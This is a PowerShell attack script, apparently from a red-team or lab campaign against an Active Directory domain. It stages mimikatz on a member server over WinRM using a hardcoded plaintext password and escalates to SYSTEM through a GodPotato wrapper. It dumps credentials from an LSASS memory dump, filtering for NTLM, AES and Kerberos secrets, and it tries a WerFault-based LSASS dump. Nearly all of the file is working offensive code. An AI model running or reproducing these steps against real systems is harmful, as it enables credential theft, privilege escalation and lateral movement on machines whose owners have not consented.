# 3.5K verify: (1) copy mimikatz to mbr01, (2) sekurlsa on the dump, (3) WerFault attempt
$ErrorActionPreference = 'Continue'

$mbr01 = 'mbr01.child.cadre.local'
$dump  = 'C:\Windows\Temp\cadre-lsass.dmp'

# 1. Stage mimikatz to mbr01 via WinRM (analyst_t1 has write access to cadre-tools)
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', (ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force))
$session = New-PSSession -ComputerName $mbr01 -Credential $cred
Copy-Item -Path 'C:\Tools\ADTools\mimikatz.exe' -Destination 'C:\Windows\Temp\cadre-tools\mimikatz.exe' -ToSession $session -Force
Remove-PSSession $session
Write-Output 'MIK_STAGED'

# 2. Run sekurlsa::minidump on the dump as SYSTEM via GodPotato chain
$script = @"
`$ErrorActionPreference = 'Continue'
& 'C:\Windows\Temp\cadre-tools\mimikatz.exe' "sekurlsa::minidump C:\Windows\Temp\cadre-lsass.dmp" "sekurlsa::logonpasswords" "exit" 2>&1 | Select-String -Pattern 'Username|Domain|NTLM|AES|DPAPI|msv|tspkg|wdigest|kerberos' | Select-Object -First 40 | ForEach-Object { `$_.Line }
"@
& 'C:\Tools\ADTools\campaign-a-t043-system-exec.ps1' -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $script
Write-Output 'SEKURLSA_DONE'

# 3. Attempt WerFault path (named technique): werfault.exe -u -p <lsass pid> -ip <folder>
$script2 = @"
`$ErrorActionPreference = 'Continue'
`$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
Write-Output "LSASS_PID `$(`$lsass.Id)"
New-Item -ItemType Directory -Path 'C:\Windows\Temp\werdump' -Force | Out-Null
# Try documented WerFault dump invocation (non-crashing variant)
& 'C:\Windows\System32\WerFault.exe' -u -p `$(`$lsass.Id) -ip 'C:\Windows\Temp\werdump' 2>&1 | Out-Null
Start-Sleep -Seconds 5
`$wer = Get-ChildItem 'C:\Windows\Temp\werdump' -ErrorAction SilentlyContinue
if (`$wer) { `$wer | ForEach-Object { Write-Output "WER_DUMP|`$(`$_.FullName)|`$(`$_.Length)" } } else { Write-Output 'WER_DUMP_NONE' }
# Also check default WER ReportQueue for any new lsass dump
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\WER\ReportQueue' -Recurse -Filter '*.dmp' -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 3 | ForEach-Object { Write-Output "WERQ_DUMP|`$(`$_.FullName)|`$(`$_.Length)" }
Write-Output 'WER_ATTEMPT_DONE'
"@
& 'C:\Tools\ADTools\campaign-a-t043-system-exec.ps1' -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $script2
Write-Output 'WER_DONE'
